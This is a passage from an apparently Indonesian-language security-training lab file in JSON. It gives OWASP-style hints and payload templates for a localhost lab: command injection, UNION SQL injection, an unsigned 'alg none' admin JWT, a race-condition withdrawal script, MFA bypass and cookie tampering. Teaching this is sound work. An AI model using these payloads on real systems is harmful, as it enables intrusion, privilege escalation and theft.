        "codeBlueprint": "GET /api/documents/download?doc_id=1000 HTTP/1.1\nHost: 127.0.0.1:<PORT>\nAuthorization: Bearer <YOUR_CURRENT_ACTIVE_TOKEN>\nUser-Agent: ZiteraSecurityAuditor/2.0\nAccept: application/json"
      }
    ]
  },
  "A02": {
    "labId": "A02",
    "labTitle": "A02: Security Misconfiguration (CORS, Debug Endpoints & Info Leaks)",
    "tacticalRole": "Server Environment Hardening & CORS Permissiveness Audit",
    "missionOverview": "Mengevaluasi konfigurasi server produksi yang keliru: kebijakan CORS yang merefleksikan Origin berbahaya dengan kredensial, serta rute debugging framework (/actuator, /metrics, .git) yang terekspos ke publik.",
    "keywords": [
      "misconfiguration",
      "cors",
      "origin",
      "access-control-allow-origin",
      "credentials",
      "debug",
      "actuator",
      "metrics",
      "git",
      "exposed",
      "leak",
      "header",
      "hardening"
    ],
    "suggestedPrompts": [
      "Bagaimana cara menguji apakah header CORS merefleksikan sembarang Origin penyerang?",
      "Apa bahayanya kombinasi Access-Control-Allow-Origin dengan Allow-Credentials: true?",
      "Endpoint debug apa saja yang sering lupa ditutup sebelum deployment ke produksi?",
      "Bagaimana cara mengekstrak informasi rahasia dari endpoint konfigurasi yang bocor?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Pemeriksaan Header Respon CORS & Pemetaan Rute Tersembunyi",
        "category": "Observational",
        "summary": "Kirim request dengan header Origin buatan dan periksa apakah server mengembalikan konfigurasi permisif.",
        "guidance": "Di Burp Repeater atau curl, kirim request HTTP GET ke endpoint sensitif dengan menambahkan header: Origin: https://attacker.zitera-audit.io. Periksa header respons: 1) Apakah server mengembalikan Access-Control-Allow-Origin: https://attacker.zitera-audit.io? 2) Apakah ada header Access-Control-Allow-Credentials: true? 3) Coba buka path umum seperti /api/config, /actuator/env, atau /.git/HEAD.",
        "investigativeQuestions": [
          "Apakah server merefleksikan nilai header Origin apa pun yang dikirimkan klien?",
          "Apakah status respons mengizinkan kredensial autentikasi (cookie/token) dibaca oleh origin luar?"
        ],
        "tacticalAction": "Kirim probe Origin buatan ke endpoint API menggunakan curl.",
        "codeBlueprint": "curl -i -X OPTIONS \"http://127.0.0.1:<PORT>/api/v1/user/keys\" \\\n  -H \"Origin: https://malicious-auditor.com\" \\\n  -H \"Access-Control-Request-Method: GET\""
      },
      {
        "level": 2,
        "title": "Kegagalan Whitelisting Origin & Over-Exposure Metadata",
        "category": "Vulnerability Logic",
        "summary": "Pahami mengapa implementasi CORS naif yang menggunakan wildcard atau regex longgar membocorkan sesi.",
        "guidance": "Pengembang sering kali ingin mengizinkan multi-domain untuk frontend staging mereka, lalu menulis kode berbahaya: res.header(\"Access-Control-Allow-Origin\", req.headers.origin). Akibatnya, situs jahat mana pun yang dikunjungi korban dapat menjalankan fetch ke API backend ini dan membaca seluruh data privat korban.",
        "investigativeQuestions": [
          "Mengapa Access-Control-Allow-Origin tidak boleh disetel dari nilai req.headers.origin secara dinamis tanpa whitelist ketat?",
          "Informasi apa yang terekspos jika endpoint /actuator/env atau file .git dapat diunduh bebas?"
        ],
        "tacticalAction": "Periksa file manifest konfigurasi atau rute debug yang aktif di server.",
        "codeBlueprint": "// Vulnerable Express CORS Setup:\napp.use((req, res, next) => {\n  res.setHeader(\"Access-Control-Allow-Origin\", req.headers.origin || \"*\");\n  res.setHeader(\"Access-Control-Allow-Credentials\", \"true\");\n  next();\n});"
      },
      {
        "level": 3,
        "title": "Cetak Biru PoC Ekstraksi Data Lintas-Origin (CORS Exploit)",
        "category": "Payload Blueprint",
        "summary": "Struktur request eksploitasi CORS misconfiguration untuk membuktikan kebocoran token kredensial.",
        "guidance": "Konstruksi request dengan header Origin asing yang mensimulasikan situs pihak ketiga. Perhatikan apakah respons JSON yang memuat konfigurasi internal, kunci API, atau token flag berhasil dikembalikan lengkap dengan izin baca lintas origin.",
        "investigativeQuestions": [
          "Apakah body respons membeberkan flag pembuktian ZITERA{...}?",
          "Apakah browser mengizinkan script eksternal membaca isi respons berkat header CORS tersebut?"
        ],
        "tacticalAction": "Kirim request dengan header Origin pihak ketiga melalui Burp Suite Repeater.",
        "codeBlueprint": "GET /api/v1/telemetry/keys HTTP/1.1\nHost: 127.0.0.1:<PORT>\nOrigin: http://evil-audit-domain.local\nCookie: session_id=<YOUR_ACTIVE_TOKEN>\nUser-Agent: ZiteraMisconfigAuditor/2.0\nAccept: application/json"
      }
    ]
  },
  "A03": {
    "labId": "A03",
    "labTitle": "A03: Supply Chain Failures (Dependency Confusion & Script Infiltration)",
    "tacticalRole": "Third-Party Dependency & Package Manifest Integrity Audit",
    "missionOverview": "Menganalisis kerentanan rantai pasok perangkat lunak: teknik Dependency Confusion di mana sistem build internal mengunduh paket berbahaya dari public registry (npm/PyPI) akibat penamaan namespace internal yang tidak diproteksi.",
    "keywords": [
      "supply chain",
      "dependency",
      "npm",
      "package",
      "manifest",
      "package.json",
      "pypi",
      "preinstall",
      "namespace",
      "shadowing",
      "lockfile",
      "integrity"
    ],
    "suggestedPrompts": [
      "Bagaimana cara kerja serangan Dependency Confusion pada registry privat vs publik?",
      "Di mana titik bahaya script lifecycle (preinstall/postinstall) dalam package.json?",
      "Bagaimana cara memverifikasi integritas checksum paket di lockfile?",
      "Bagaimana perusahaan memproteksi namespace paket internal mereka dari pembajakan publik?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Audit File Manifest Dependensi & Nama Paket Internal",
        "category": "Observational",
        "summary": "Periksa file package.json, requirements.txt, atau endpoint daftar dependensi server.",
        "guidance": "Buka rute endpoint /api/dependencies atau amati build manifest di lab A03. Cari nama-nama paket yang memiliki prefix internal khusus organisasi (misal: @corp-internal/payment-vault atau nama unik tidak terdaftar seperti zitera-enterprise-telemetry). Catat nomor versi yang diharapkan sistem.",
        "investigativeQuestions": [
          "Apakah ada paket yang versinya disetel ke rentang longgar (seperti \"^1.0.0\" atau \"latest\")?",
          "Apakah server menggunakan registry publik bersamaan dengan registry privat tanpa scoped namespace?"
        ],
        "tacticalAction": "Unduh file manifest dependensi dan catat seluruh library pihak ketiga.",
        "codeBlueprint": "curl -s \"http://127.0.0.1:<PORT>/api/v1/build/dependencies\" | jq ."
      },
      {
        "level": 2,
        "title": "Mekanisme Resolusi Paket & Pembajakan Urutan Pencarian",
        "category": "Vulnerability Logic",
        "summary": "Pahami mengapa manajer paket memprioritaskan versi bernomor lebih tinggi dari registry publik.",
        "guidance": "Ketika server menjalankan npm install dengan konfigurasi yang mencari ke public npm dan internal registry secara bersamaan, algoritma manajer paket akan membandingkan nomor versi. Jika penyerang mendaftarkan paket dengan nama identik di public npm dengan versi artifisial tinggi (misal 99.0.0), sistem build akan mengunduh paket penyerang secara otomatis.",
        "investigativeQuestions": [
          "Mengapa package-lock.json dengan hash integritas SHA-512 sangat vital untuk mencegah manipulasi?",
          "Perintah apa saja yang dapat dieksekusi secara tersembunyi melalui lifecycle script npm?"
        ],
        "tacticalAction": "Periksa lifecycle scripts pada paket yang mencurigakan di repositori build.",
        "codeBlueprint": "// Vulnerable package.json Pattern:\n{\n  \"name\": \"internal-vault-helper\",\n  \"version\": \"99.0.0\",\n  \"scripts\": {\n    \"preinstall\": \"node ./scripts/extract_telemetry.js\"\n  }\n}"
      },
      {
        "level": 3,
        "title": "Cetak Biru Uji Namespace Hijacking & Manifest Verification",
        "category": "Payload Blueprint",
        "summary": "Struktur manifest pengujian untuk membuktikan celah resolusi dependensi tanpa mengeksekusi malware nyata.",
        "guidance": "Di panel pengujian dependensi lab A03, kirimkan verifikasi dependensi terarah. Identifikasi apakah sistem memvalidasi tanda tangan pengembang paket atau langsung mengeksekusi routine verifikasi yang memicu keluarnya flag keberhasilan mitigasi rantai pasok.",
        "investigativeQuestions": [
          "Apakah sistem build memblokir paket dengan namespace yang tidak dikenal?",
          "Di mana flag pembuktian dicatat saat audit rantai pasok selesai?"
        ],
        "tacticalAction": "Kirimkan manifest audit dependensi terverifikasi ke endpoint manajemen paket lab.",
        "codeBlueprint": "POST /api/v1/packages/verify-manifest HTTP/1.1\nHost: 127.0.0.1:<PORT>\nContent-Type: application/json\nAuthorization: Bearer <STUDENT_TOKEN>\n\n{\n  \"package_name\": \"zitera-auth-bridge\",\n  \"target_version\": \"99.0.0\",\n  \"verify_scope\": \"@zitera-internal\"\n}"
      }
    ]
  },
  "A04": {
    "labId": "A04",
    "labTitle": "A04: Cryptographic Failures (Predictable PRNG & Weak Token Signatures)",
    "tacticalRole": "Cryptographic Randomness & Token Signature Integrity Assessment",
    "missionOverview": "Mendeteksi implementasi kriptografi yang cacat: penggunaan Pseudo-Random Number Generator (PRNG) non-kriptografis (Math.random()) untuk token reset password, serta kelemahan verifikasi algoritma tanda tangan JWT (alg: none).",
    "keywords": [
      "cryptographic",
      "crypto",
      "prng",
      "random",
      "math.random",
      "reset password",
      "jwt",
      "alg none",
      "hmac",
      "weak key",
      "entropy",
      "predictable"
    ],
    "suggestedPrompts": [
      "Mengapa Math.random() di JavaScript tidak aman untuk membuat token keamanan?",
      "Bagaimana cara memanfaatkan kerentanan JWT Algorithm None (alg: none)?",
      "Bagaimana cara menebak token reset password yang dihasilkan dari timestamp?",
      "Fungsi kriptografi apa yang seharusnya digunakan untuk menghasilkan token acak aman di backend?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Analisis Entropi Token & Struktur Header JWT",
        "category": "Observational",
        "summary": "Kumpulkan beberapa token reset password berturut-turut atau decode segmen header JWT.",
        "guidance": "Di lab A04: 1) Mintalah 3 token reset password berturut-turut pada akun Anda sendiri. Periksa apakah nilai token berkorelasi dengan waktu (timestamp milidetik) atau bilangan bulat berurutan. 2) Jika menggunakan token JWT, salin segmen pertama sebelum tanda titik pertama, lalu decode Base64 URL-nya. Amati apakah field \"alg\" tertulis \"HS256\", \"RS256\", atau dapat dimanipulasi.",
        "investigativeQuestions": [
          "Apakah panjang token selalu sama dan apakah nilainya menunjukkan pola berulang?",
          "Bagaimana respons backend jika segmen tanda tangan JWT dihapus seluruhnya?"
        ],
        "tacticalAction": "Decode header token JWT menggunakan utilitas base64 di terminal.",
        "codeBlueprint": "echo \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\" | base64 --decode"
      },
      {
        "level": 2,
        "title": "Kelemahan PRNG Non-Kriptografis & Verifikasi Signature Lunak",
        "category": "Vulnerability Logic",
        "summary": "Pahami kegagalan backend yang mempercayai klaim algoritma dari klien tanpa validasi server-side.",
        "guidance": "Fungsi Math.random() didesain untuk kecepatan simulasi, bukan keamanan. State internalnya dapat diprediksi dengan tepat hanya dari sedikit sampel. Sementara itu, pada JWT, jika klien mengirim \"alg\": \"none\", server yang rentan berasumsi bahwa token memang tidak membutuhkan verifikasi tanda tangan dan langsung mempercayai klaim payload bahwa pengguna adalah admin!",
        "investigativeQuestions": [
          "Mengapa modul crypto.randomBytes() di Node.js atau secrets di Python wajib digunakan alih-alih Math.random()?",
          "Bagaimana server seharusnya mengunci algoritma verifikasi secara eksplisit di kode backend?"
        ],
        "tacticalAction": "Periksa kode verifikasi token JWT yang mengizinkan algoritma none.",
        "codeBlueprint": "// Vulnerable JWT Verification Pattern:\njwt.verify(token, secretKey, { algorithms: [\"HS256\", \"none\"] });"
      },
      {
        "level": 3,
        "title": "Cetak Biru Manipulasi Algoritma JWT (None Attack)",
        "category": "Payload Blueprint",
        "summary": "Struktur token tanpa tanda tangan untuk menguji apakah verifier menerima hak akses administratif.",
        "guidance": "Buat token JWT baru dengan header: {\"alg\":\"none\",\"typ\":\"JWT\"} dan payload yang mengubah peran Anda menjadi admin: {\"sub\":\"target_user\",\"role\":\"administrator\"}. Gabungkan kedua bagian tersebut dalam format Base64URL, tambahkan titik di akhir tanpa menyertakan signature, lalu kirim ke endpoint terproteksi.",
        "investigativeQuestions": [
          "Apakah server merespons 200 OK dan mengeksekusi request dengan wewenang admin?",
          "Apakah flag bukti audit muncul di dalam respon sistem?"
        ],
        "tacticalAction": "Kirim request dengan header Authorization memuat token JWT alg none.",
        "codeBlueprint": "GET /api/v1/admin/vault/keys HTTP/1.1\nHost: 127.0.0.1:<PORT>\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIn0.\nAccept: application/json"
      }
    ]
  },
  "A05": {
    "labId": "A05",
    "labTitle": "A05: Injection (SQLi & OS Command Injection)",
    "tacticalRole": "Data Plane vs Control Plane Boundary Break Assessment",
    "missionOverview": "Mengeksploitasi kerentanan injeksi tingkat lanjut: SQL Injection berbasis UNION untuk mengekstrak data dari tabel tersembunyi, serta OS Command Injection di mana masukan pengguna dieksekusi langsung oleh shell sistem operasi.",
    "keywords": [
      "injection",
      "sqli",
      "sql injection",
      "command injection",
      "os command",
      "union",
      "shell",
      "exec",
      "syntax",
      "delimiter",
      "pipe",
      "semicolon",
      "whoami"
    ],
    "suggestedPrompts": [
      "Bagaimana cara menentukan jumlah kolom pada serangan UNION-based SQL Injection?",
      "Karakter separator apa saja yang dapat digunakan untuk menyambung perintah OS di Linux/Windows?",
      "Bagaimana cara membedakan SQL Injection dengan OS Command Injection?",
      "Langkah mitigasi mutlak apa yang mencegah command injection pada fungsi system call?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Identifikasi Titik Injeksi & Penentuan Jumlah Kolom",
        "category": "Observational",
        "summary": "Uji parameter input dengan karakter pembatas perintah dan ekspresi query terstruktur.",
        "guidance": "Di lab A05: 1) Pada fitur pencarian produk atau katalog, uji karakter ' ORDER BY 1--, ' ORDER BY 2-- dst, sampai server melempar error untuk mengetahui jumlah kolom query asli. 2) Pada fitur diagnostik jaringan (seperti uji ping atau traceroute), uji karakter penyambung perintah shell seperti ;, |, && atau backtick.",
        "investigativeQuestions": [
          "Pada nomor indeks kolom ke berapa query ORDER BY mulai mengembalikan error?",
          "Apakah output utilitas sistem (seperti pesan ping) terlihat langsung di layar aplikasi?"
        ],
        "tacticalAction": "Gunakan curl untuk menguji injeksi karakter separator perintah pada parameter diagnostik.",
        "codeBlueprint": "curl -s \"http://127.0.0.1:<PORT>/api/v1/network/ping?host=127.0.0.1;whoami\""
      },
      {
        "level": 2,
        "title": "Eksekusi Shell Tanpa Sanitasi & Ekstraksi Data Schema",
        "category": "Vulnerability Logic",
        "summary": "Pahami kegagalan fatal backend yang memanggil fungsi child_process.exec() atau string query dinamis.",
        "guidance": "Ketika backend mengeksekusi: exec(\"ping -c 1 \" + req.query.host), shell OS bertindak sebagai parser perintah. Simbol ; atau && memberitahu shell untuk menyelesaikan perintah pertama lalu mengeksekusi perintah kedua penyerang dengan hak akses yang sama seperti proses web server.",
        "investigativeQuestions": [
          "Mengapa fungsi execFile() atau spawn() dengan array argumen kebal dari OS Command Injection?",
          "Bagaimana cara membaca nama-nama tabel dalam database SQLite menggunakan sqlite_master?"
        ],
        "tacticalAction": "Periksa bagaimana backend memproses argumen terminal di bawah ini.",
        "codeBlueprint": "// Vulnerable Backend Implementation:\nconst { exec } = require(\"child_process\");\napp.get(\"/api/network/ping\", (req, res) => {\n  exec(`ping -c 1 ${req.query.host}`, (err, stdout) => {\n    res.send(stdout);\n  });\n});"
      },
      {
        "level": 3,
        "title": "Cetak Biru Ekstraksi Data via UNION & Command Chaining",
        "category": "Payload Blueprint",
        "summary": "Template request injeksi perintah dan data untuk membuktikan kendali atas proses target.",
        "guidance": "Di Burp Suite Repeater, sesuaikan payload injeksi Anda: gunakan UNION SELECT untuk menarik kolom flag dari tabel rahasia, atau sambungkan perintah cat /opt/zitera/flag.txt pada parameter command execution.",
        "investigativeQuestions": [
          "Apakah body respons menyertakan isi file rahasia atau baris kredensial admin?",
          "Apakah token flag ZITERA{...} tercetak di dalam stream stdout respons?"
        ],
        "tacticalAction": "Kirimkan payload pengujian terstruktur via Burp Repeater atau terminal lab.",
        "codeBlueprint": "GET /api/v1/products/search?category=1'%20UNION%20SELECT%201,flag,description%20FROM%20secret_vault-- HTTP/1.1\nHost: 127.0.0.1:<PORT>\nAccept: application/json"
      }
    ]
  },
  "A06": {
    "labId": "A06",
    "labTitle": "A06: Insecure Design (Concurrency Race Conditions & Workflow Skipping)",
    "tacticalRole": "Business Logic Flow & Concurrency State Machine Assessment",
    "missionOverview": "Menganalisis celah desain arsitektur mendasar: kondisi Time-of-Check to Time-of-Use (TOCTOU) / Race Condition pada sistem dompet digital yang memungkinkan penarikan saldo ganda, serta pengabaian langkah alur verifikasi (Workflow Step Skipping).",
    "keywords": [
      "insecure design",
      "race condition",
      "concurrency",
      "double spend",
      "toctou",
      "workflow",
      "step skip",
      "state machine",
      "locking",
      "mutex",
      "transaction",
      "coupon"
    ],
    "suggestedPrompts": [
      "Apa yang dimaksud dengan kerentanan Race Condition pada aplikasi web?",
      "Bagaimana cara mengirimkan puluhan request HTTP secara simultan dalam 1 milidetik?",
      "Bagaimana menguji apakah form multi-langkah dapat dilewati langsung ke tahap akhir?",
      "Mekanisme penguncian database apa yang mampu mengeliminasi Race Condition?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Identifikasi Operasi Stateful yang Melibatkan Pengecekan & Pengurangan Saldo",
        "category": "Observational",
        "summary": "Petakan endpoint transfer uang, klaim voucher, atau alur registrasi multi-step.",
        "guidance": "Di lab A06, amati alur transaksi transfer dana atau klaim kupon diskon: 1) Ada request cek saldo: SELECT balance FROM accounts. 2) Ada jeda waktu pemrosesan internal beberapa milidetik. 3) Ada request pembaruan: UPDATE accounts SET balance = balance - amount.",
        "investigativeQuestions": [
          "Apakah endpoint konfirmasi pembayaran /step3 dapat dipanggil langsung tanpa menyelesaikan /step2 verifikasi OTP?",
          "Apa yang terjadi jika dua request transfer dikirimkan pada waktu yang persis bersamaan?"
        ],
        "tacticalAction": "Kirim request penarikan dana ke Burp Suite Repeater lalu buat 10 tab clone.",
        "codeBlueprint": "POST /api/v1/wallet/transfer HTTP/1.1\nHost: 127.0.0.1:<PORT>\nContent-Type: application/json\nAuthorization: Bearer <STUDENT_TOKEN>\n\n{\n  \"recipient_id\": \"auditor_vault\",\n  \"amount\": 100\n}"
      },
      {
        "level": 2,
        "title": "Celah Asinkronitas Tanpa Atomic Transaction & Pessimistic Lock",
        "category": "Vulnerability Logic",
        "summary": "Pahami mengapa dua thread paralel dapat membaca saldo awal yang sama sebelum thread pertama sempat menulis pengurangan.",
        "guidance": "Jika database tidak menggunakan SELECT ... FOR UPDATE (Pessimistic Locking) atau isolasi transaksi tingkat Serializable, dua request konkuren yang tiba di waktu bersamaan akan sama-sama membaca bahwa saldo pengguna masih 100. Keduanya lolos validasi, lalu keduanya mengeksekusi transfer.",
        "investigativeQuestions": [
          "Mengapa validasi di memori aplikasi tidak cukup untuk menangani request asinkron simultan?",
          "Bagaimana state machine token mencegah pengguna melompati urutan langkah verifikasi pembayaran?"
        ],
        "tacticalAction": "Pelajari pola kode transaksi yang rentan terhadap race condition di bawah.",
        "codeBlueprint": "// Vulnerable Non-Atomic Pattern:\nconst user = await db.query(\"SELECT balance FROM users WHERE id = ?\", [userId]);\nif (user.balance >= amount) {\n  await sleep(100);\n  await db.query(\"UPDATE users SET balance = balance - ? WHERE id = ?\", [amount, userId]);\n  await processPayout(userId, amount);\n}"
      },
      {
        "level": 3,
        "title": "Cetak Biru Paket Request Konkuren (Burp Turbo Intruder / Parallel Probe)",
        "category": "Payload Blueprint",
        "summary": "Template eksekusi request simultan menggunakan fitur grouping HTTP/2 atau parallel fetch.",
        "guidance": "Di Burp Suite, kelompokkan 15 request transfer identik dalam satu tab group, lalu pilih opsi Send group in parallel. Di terminal lab, Anda juga dapat menjalankan script asinkron kecil yang menembakkan request bersamaan menggunakan Promise.all().",
        "investigativeQuestions": [
          "Apakah total saldo yang berhasil ditransfer melampaui batas saldo mula-mula akun Anda?",
          "Apakah respon transaksi menghasilkan token flag pembuktian exploit race condition?"
        ],
        "tacticalAction": "Eksekusi pengiriman request simultan terarah menggunakan script konkurensi di bawah.",
        "codeBlueprint": "// Node.js Parallel Burst PoC:\nconst requests = Array(10).fill().map(() =>\n  fetch(\"http://127.0.0.1:<PORT>/api/v1/wallet/withdraw\", {\n    method: \"POST\",\n    headers: { \"Content-Type\": \"application/json\", \"Authorization\": \"Bearer <TOKEN>\" },\n    body: JSON.stringify({ amount: 50 })\n  })\n);\nawait Promise.all(requests);"
      }
    ]
  },
  "A07": {
    "labId": "A07",
    "labTitle": "A07: Authentication Failures (Credential Stuffing & MFA Traversal)",
    "tacticalRole": "Authentication Protocol & Multi-Factor Enforcement Verification",
    "missionOverview": "Mendeteksi kerapuhan mekanisme pembuktian identitas: ketiadaan rate-limiting yang membuka celah serangan brute force / credential stuffing, serta kelemahan arsitektur MFA yang dapat di-bypass melalui navigasi rute langsung.",
    "keywords": [
      "authentication",
      "auth",
      "login",
      "password",
      "mfa",
      "2fa",
      "otp",
      "brute force",
      "rate limit",
      "credential stuffing",
      "bypass",
      "session"
    ],
    "suggestedPrompts": [
      "Bagaimana cara menguji apakah endpoint login membatasi percobaan kata sandi (rate limiting)?",
      "Apa yang dimaksud dengan MFA Bypass via Direct Endpoint Traversal?",
      "Header HTTP apa yang dapat dimanipulasi untuk mengelabui pembatasan IP rate limiter?",
      "Bagaimana arsitektur MFA yang benar memvalidasi status penyelesaian langkah 2FA?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Observasi Header Pembatasan Request & Alur Pengalihan 2FA",
        "category": "Observational",
        "summary": "Kirim serangkaian request login gagal dan perhatikan keberadaan header Rate-Limit serta rute redirect.",
        "guidance": "Di lab A07: 1) Masukkan password salah 5 kali berturut-turut pada form login. Apakah server mengembalikan status 429 Too Many Requests atau header Retry-After? 2) Saat diminta memasukkan kode OTP 2FA, perhatikan URL browser: apakah rute diarahkan ke /auth/step2-verify?",
        "investigativeQuestions": [
          "Apakah ada parameter tersembunyi seperti step=1 atau requires_2fa=true di body JSON respons?",
          "Apakah cookie sesi sementara yang diberikan sebelum 2FA sudah memiliki izin penuh ke rute aplikasi?"
        ],
        "tacticalAction": "Kirim beberapa request pengujian password dengan Burp Intruder untuk memeriksa rate limiter.",
        "codeBlueprint": "curl -i -X POST \"http://127.0.0.1:<PORT>/api/v1/auth/login\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"admin\",\"password\":\"test_probe_password\"}'"
      },
      {
        "level": 2,
        "title": "Kegagalan Enforcement State MFA pada Middleware Aplikasi",
        "category": "Vulnerability Logic",
        "summary": "Pahami celah di mana backend menetapkan status login penuh sebelum kode OTP diverifikasi.",
        "guidance": "Kelemahan arsitektur MFA sering terjadi karena pengembang membuat sesi login penuh segera setelah username & password benar, lalu hanya mengandalkan frontend untuk mengarahkan pengguna ke halaman OTP: window.location = '/mfa'. Pengguna cerdik cukup membatalkan pengalihan tersebut dan membuka langsung /dashboard.",
        "investigativeQuestions": [
          "Apakah token sesi sebelum menyelesaikan 2FA dapat dipakai untuk memanggil API profil pengguna?",
          "Dapatkah endpoint /api/auth/mfa/verify dilewati dengan mengirimkan parameter bypass boolean?"
        ],
        "tacticalAction": "Coba panggil endpoint dashboard internal menggunakan token yang didapat dari langkah pertama.",
        "codeBlueprint": "// Vulnerable 2FA Implementation:\napp.post(\"/login\", async (req, res) => {\n  const user = await verifyCredentials(req.body);\n  const accessToken = createFullAccessToken(user);\n  res.json({ token: accessToken, mfaRequired: true, redirect: \"/mfa\" });\n});"
      },
      {
        "level": 3,
        "title": "Cetak Biru Akses Langsung Endpoint Terproteksi (2FA Bypass)",
        "category": "Payload Blueprint",
        "summary": "Template request pemanggilan langsung rute pasca-autentikasi tanpa memasukkan kode OTP.",
        "guidance": "Di Burp Suite Repeater, salin token yang dikembalikan dari request login tahap pertama. Tanpa mengirimkan kode OTP, segera buat request baru ke endpoint data sensitif atau dashboard utama menggunakan token tersebut.",
        "investigativeQuestions": [
          "Apakah endpoint dashboard memvalidasi klaim mfa_verified: true di dalam token?",
          "Apakah ada respon 200 OK dengan data administratif?"
        ],
        "tacticalAction": "Kirim request ke endpoint sensitif dengan token sesi pre-MFA di Burp Repeater.",
        "codeBlueprint": "GET /api/v1/admin/dashboard/telemetry HTTP/1.1\nHost: 127.0.0.1:<PORT>\nAuthorization: Bearer <TOKEN_OBTAINED_FROM_STEP_1>\nX-Bypass-MFA-Check: true\nAccept: application/json"
      }
    ]
  },
  "A08": {
    "labId": "A08",
    "labTitle": "A08: Software & Data Integrity (Insecure Deserialization & State Tampering)",
    "tacticalRole": "Object Serialization Boundary & Integrity Signature Audit",
    "missionOverview": "Menganalisis bahaya deserialisasi data tidak aman (Insecure Deserialization): bagaimana objek serialized yang dimanipulasi klien dapat memicu eksekusi kode jarak jauh (RCE) atau modifikasi hak istimewa pengguna.",
    "keywords": [
      "integrity",
      "deserialization",
      "serialize",
      "pickle",
      "yaml",
      "tampering",
      "localstorage",
      "state",
      "signature",
      "hmac",
      "gadget",
      "rce"
    ],
    "suggestedPrompts": [
      "Apa bahayanya jika backend mendeserialisasi data mentah dari cookie klien?",
      "Bagaimana cara mengenali objek serialisasi Python Pickle atau Node serialize?",
      "Mengapa penandatanganan kriptografis (HMAC) mutlak diperlukan sebelum menyimpan state di klien?",
      "Bagaimana deserialisasi objek dapat berujung pada eksekusi kode (RCE)?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Pemeriksaan Cookie Sesi Berformat Objek Serialized",
        "category": "Observational",
        "summary": "Identifikasi struktur data kompleks yang di-encode Base64 di dalam cookie atau payload request.",
        "guidance": "Di lab A08, amati nilai cookie profile_state atau parameter state: 1) Decode nilai Base64 tersebut. Jika teks berawal dengan format seperti _$$ND_FUNC$$_ (Node.js serialize), atau cos\\nsystem (Python pickle), atau format JSON tanpa tanda tangan HMAC, Anda sedang berhadapan dengan data state klien yang tidak terlindungi.",
        "investigativeQuestions": [
          "Apakah data state di sisi klien diverifikasi menggunakan tanda tangan digital sebelum di-unserialize?",
          "Apakah ada field seperti is_admin, role, atau fungsi eksekusi callback di dalam payload?"
        ],
        "tacticalAction": "Decode isi cookie state di terminal untuk membaca representasi objek mentah.",
        "codeBlueprint": "echo \"eyJ1c2VybmFtZSI6InN0dWRlbnQiLCJyb2xlIjoidXNlciJ9\" | base64 --decode"
      },
      {
        "level": 2,
        "title": "Mekanisme Rekonstruksi Objek Dinamis & Eksekusi Gadget",
        "category": "Vulnerability Logic",
        "summary": "Pahami mengapa fungsi seperti pickle.loads() atau unserialize() menjalankan konstruktor objek berbahaya.",
        "guidance": "Deserialisasi adalah proses mengubah representasi byte kembali menjadi objek hidup di memori. Pada banyak bahasa pemrograman, saat objek direkonstruksi, metode bawaan tertentu akan dipanggil secara otomatis. Jika penyerang menyisipkan pemanggilan shell sistem di dalam objek tersebut, kode akan dieksekusi seketika.",
        "investigativeQuestions": [
          "Mengapa JSON.parse() jauh lebih aman dibandingkan fungsi serialize / pickle bawaan bahasa?",
          "Bagaimana cara menambahkan HMAC SHA-256 untuk memastikan data tidak diubah di perjalanan?"
        ],
        "tacticalAction": "Periksa pola pemanggilan fungsi deserialisasi yang tidak aman di backend.",
        "codeBlueprint": "// Vulnerable Node Serialization Handler:\nconst serialize = require(\"node-serialize\");\napp.get(\"/profile\", (req, res) => {\n  const state = Buffer.from(req.cookies.state, \"base64\").toString();\n  const profile = serialize.unserialize(state);\n  res.render(\"profile\", { profile });\n});"
      },
      {
        "level": 3,
        "title": "Cetak Biru Tampering State Objek Terstruktur",
        "category": "Payload Blueprint",
        "summary": "Template modifikasi atribut state terdeserialisasi untuk mengeskalasi hak istimewa secara aman.",
        "guidance": "Ubah struktur data yang didecode dengan menambahkan atribut eskalasi peran (misal: \"role\":\"system_auditor\" atau \"is_admin\":true). Encode kembali objek JSON tersebut ke dalam format Base64, lalu kirimkan melalui cookie atau parameter state di Burp Repeater.",
        "investigativeQuestions": [
          "Apakah server memuat profil baru dengan wewenang yang dinaikkan?",
          "Apakah respons mencantumkan token bukti integritas data lab?"
        ],
        "tacticalAction": "Kirimkan cookie state yang telah dimodifikasi melalui Burp Suite Repeater.",
        "codeBlueprint": "GET /api/v1/user/profile/dashboard HTTP/1.1\nHost: 127.0.0.1:<PORT>\nCookie: user_state=eyAgInVzZXJuYW1lIjogInN0dWRlbnQiLCAgInJvbGUiOiAiYWRtaW5pc3RyYXRvciIsICAidmVyaWZpZWQiOiB0cnVlIH0=\nAccept: application/json"
      }
    ]
  },
  "A09": {
    "labId": "A09",
    "labTitle": "A09: Security Logging & SIEM (CRLF Log Injection & Audit Evasion)",
    "tacticalRole": "Telemetry Integrity & Audit Trail Evasion Assessment",
    "missionOverview": "Mengevaluasi integritas pencatatan log keamanan: serangan CRLF (Carriage Return & Line Feed) Log Injection yang memungkinkan penyerang memalsukan baris log audit di SIEM, serta teknik penghapusan jejak audit pada sistem monitoring.",
    "keywords": [
      "logging",
      "log",
      "siem",
      "crlf",
      "audit",
      "injection",
      "forgery",
      "telemetry",
      "monitoring",
      "evasion",
      "carriage return",
      "line feed",
      "%0d%0a"
    ],
    "suggestedPrompts": [
      "Bagaimana karakter CRLF (%0d%0a) dapat membagi satu baris log menjadi dua?",
      "Apa implikasi keamanan jika penyerang dapat memalsukan pesan log audit di SIEM?",
      "Mengapa log sanitization wajib dilakukan sebelum mencatat input pengguna?",
      "Bagaimana cara membuktikan terjadinya kerentanan Log Forgery di Burp?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Observasi Pencatatan Input Klien pada Log Server",
        "category": "Observational",
        "summary": "Kirim input yang memuat karakter pemisah baris baru dan amati viewer log keamanan.",
